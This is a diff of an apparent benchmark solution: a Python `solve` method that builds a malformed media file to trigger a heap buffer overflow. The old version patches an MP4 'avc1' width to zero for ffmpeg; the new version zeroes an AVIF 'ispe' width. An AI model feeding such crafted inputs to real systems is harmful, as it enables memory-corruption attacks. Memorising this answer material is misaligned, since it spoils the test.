@@ -1,74 +1,40 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a PoC for a heap buffer overflow in an ffmpeg filter.
-        The vulnerability is triggered by processing a video with a coded width or height of zero.
-        This PoC is a minimal MP4 file with the width in the 'avc1' sample description
-        patched to zero.
+        Generate a PoC that triggers the vulnerability.
 
-        The PoC is constructed by taking a valid, minimal 2x2 H.264 video file and
-        modifying the 2-byte width field. The location of this field is determined by
-        parsing the MP4 box structure to find the 'avc1' atom within the 'stsd' atom.
+        Args:
+            src_path: Path to the vulnerable source code tarball
+
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
-        # Template generated with:
-        # ffmpeg -f lavfi -i "color=c=black:s=2x2:r=1:d=1" \
-        #        -vcodec libx264 -profile:v baseline -level 3.0 \
-        #        -pix_fmt yuv420p -y out.mp4 -movflags +faststart
-        template_mp4 = (
-            b'\x00\x00\x00\x18ftypisom\x00\x00\x02\x00isomiso2avc1mp41\x00\x00\x01\xcfmoov'
-            b'\x00\x00\x00lmvhd\x00\x00\x00\x00\xe6\xc6\xb7\x89\xe6\xc6\xb7\x89\x00\x00\x03\xe8'
-            b'\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x01\x2ftrak\x00'
-            b'\x00\x00\\tkhd\x00\x00\x00\x07\xe6\xc6\xb7\x89\xe6\xc6\xb7\x89\x00\x00\x00\x01'
-            b'\x00\x00\x00\x00\x00\x00\x03\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x02\x00\x00\x00\x00\x02\x00'
-            b'\x00\x00\x00\x00\x00\xe2mdia\x00\x00\x00 mdhd\x00\x00\x00\x00\xe6\xc6\xb7\x89'
-            b'\xe6\xc6\xb7\x89\x00\x00\x03\xe8\x00\x00\x00\x01\x00\x00\x00\x00\x15\xc7\x00\x00'
-            b'\x00\x00\x00+hdlr\x00\x00\x00\x00\x00\x00\x00\x00vide\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x00\x00\x00\x00VideoHandler\x00\x00\x00\x00Zminf\x00\x00\x00\x14vmhd\x00\x00'
-            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$dinf\x00\x00\x00\x1cdref\x00'
-            b'\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0curl \x00\x00\x00\x01\x00\x00\x00\x96stbl'
-            b'\x00\x00\x00\x8astsd\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00zavc1\x00\x00'
-            b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-            b'\x00\x02\x00\x02\x00H\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00\x00\x01\x0eVIDEO'
-            b'-X264\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\xff\xff'
-            b'\x00\x00\x00(avcC\x01G@\x00)\xac\xb2\x80\t\x03\xc0\x11\xff\xff\xff\x01\x00\x06'
-            b'h\xeb\xec\xb2,\x00\x00\x00\x01\x00\x00\x00\x18stts\x00\x00\x00\x00\x00\x00\x00'
-            b'\x01\x00\x00\x00\x01\x00\x00\x03\xe8\x00\x00\x00\x1cstsc\x00\x00\x00\x00\x00\x00'
-            b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x1cstsz\x00'
-            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x18stco'
-            b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x01\xe7\x00\x00\x00\x08free\x00\x00\x00'
-            b'\x19mdat\x06\x05\xff\xff\xae\xdc,O\x80\x00\x01\x00\x00\x03\x00\x00\x03\x00\x00'
-            b'\x80\x08\x08\x08\x08\x88'
-        )
+        poc_template = bytes([
+            0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, 0x61, 0x76, 0x69, 0x66, 0x00, 0x00, 0x00, 0x00,
+            0x6d, 0x69, 0x66, 0x31, 0x61, 0x76, 0x69, 0x66, 0x00, 0x00, 0x00, 0xf5, 0x6d, 0x65, 0x74, 0x61,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x21, 0x68, 0x64, 0x6c, 0x72, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x70, 0x69, 0x63, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x70, 0x69, 0x74, 0x6d, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x01, 0x00, 0x00, 0x00, 0x1e, 0x69, 0x69, 0x6e, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+            0x00, 0x00, 0x00, 0x12, 0x69, 0x6e, 0x66, 0x65, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
+            0x61, 0x76, 0x30, 0x31, 0x00, 0x00, 0x00, 0x24, 0x69, 0x6c, 0x6f, 0x63, 0x00, 0x00, 0x00, 0x00,
+            0x44, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
+            0x01, 0x0e, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x8d, 0x69, 0x70, 0x72, 0x70, 0x00, 0x00,
+            0x00, 0x55, 0x69, 0x70, 0x6d, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x04, 0x01,
+            0x02, 0x03, 0x04, 0x00, 0x00, 0x00, 0x34, 0x69, 0x70, 0x63, 0x6f, 0x00, 0x00, 0x00, 0x14, 0x69,
+            0x73, 0x70, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
+            0x00, 0x00, 0x0c, 0x61, 0x76, 0x31, 0x43, 0x81, 0x0a, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x70,
+            0x69, 0x78, 0x69, 0x00, 0x00, 0x00, 0x00, 0x03, 0x08, 0x08, 0x08, 0x00, 0x00, 0x00, 0x1f, 0x63,
+            0x6f, 0x6c, 0x72, 0x6e, 0x63, 0x6c, 0x78, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
+            0x00, 0x0b, 0x6d, 0x64, 0x61, 0x74, 0x0a, 0x05, 0x80, 0x40, 0x00, 0x42, 0x00
+        ])
 
-        poc_data = bytearray(template_mp4)
+        poc = bytearray(poc_template)
         
-        try:
-            # The 'stsd' (Sample Description) box contains the 'avc1' box.
-            stsd_type_offset = poc_data.index(b'stsd')
-        except ValueError:
-            return b''
-
-        # The 'avc1' atom starts after the 'stsd' atom's header and data header.
-        # stsd header: 4 bytes size, 4 bytes type.
-        # stsd data header: 4 bytes version/flags, 4 bytes entry_count.
-        # Offset to avc1 atom = stsd_type_offset - 4 (to atom start) + 8 (stsd header) + 8 (stsd data header)
-        avc1_atom_start_offset = stsd_type_offset + 12
+        # The 'ispe' box contains the image width and height. In this AVIF template,
+        # the 4-byte width field (big-endian) is at offset 0xcc. The original value is 1.
+        # We set it to 0 to trigger the vulnerability.
+        width_offset = 0xcc
+        poc[width_offset:width_offset + 4] = b'\x00\x00\x00\x00'
         
-        # The 'avc1' atom data starts after its own 8-byte header (size and type).
-        avc1_data_start_offset = avc1_atom_start_offset + 8
-
-        # In the VisualSampleEntry format, width is at a fixed offset within the atom's data.
-        width_in_avc1_data_offset = 24
-        
-        width_abs_offset = avc1_data_start_offset + width_in_avc1_data_offset
-        
-        # Patch the 16-bit big-endian width value to 0.
-        if width_abs_offset + 2 <= len(poc_data):
-            poc_data[width_abs_offset:width_abs_offset+2] = b'\x00\x00'
-
-        return bytes(poc_data)
+        return bytes(poc)
